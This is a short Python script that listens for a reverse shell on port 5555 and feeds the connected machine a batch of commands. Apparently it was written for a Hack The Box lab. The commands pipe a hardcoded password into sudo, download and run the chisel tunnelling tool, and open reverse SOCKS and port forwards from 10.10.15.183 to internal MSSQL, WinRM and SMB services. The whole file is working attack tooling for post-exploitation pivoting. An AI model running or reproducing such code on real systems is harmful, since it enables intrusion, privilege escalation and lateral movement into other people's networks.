#!/usr/bin/env python3
"""Interactive reverse shell for setup commands."""
import socket
import threading
import sys
import time

PORT = 5555
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print("listen", PORT, flush=True)
c, a = s.accept()
print("conn", a, flush=True)


def recv():
    while True:
        d = c.recv(8192)
        if not d:
            break
        sys.stdout.buffer.write(d)
        sys.stdout.flush()


threading.Thread(target=recv, daemon=True).start()
time.sleep(0.5)

script = r"""
echo 'opc0932k90%%lODFI93-++' | sudo -S bash -c '
set -x
cd /tmp
curl -fsSL -o chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz && gunzip -f chisel.gz && chmod +x chisel && ls -la chisel
# fallback wget
if [ ! -x /tmp/chisel ]; then wget -q -O chisel.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz && gunzip -f chisel.gz && chmod +x chisel; fi
ls -la /tmp/chisel
# start chisel client reverse socks + forwards
nohup /tmp/chisel client 10.10.15.183:8000 R:socks R:14433:172.16.0.11:1433 R:15985:172.16.0.11:5985 R:14445:127.0.0.1:445 >/tmp/chisel.log 2>&1 &
sleep 2
cat /tmp/chisel.log
ss -lntp | head
echo SETUP_DONE
'
"""
for line in script.strip().splitlines():
    c.send((line + "\n").encode())
    time.sleep(0.8)

time.sleep(25)
c.send(b"cat /tmp/chisel.log; echo END\n")
time.sleep(3)
open(r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\chisel_setup.txt", "w").write("see terminal")
print("batch done", flush=True)
c.close()
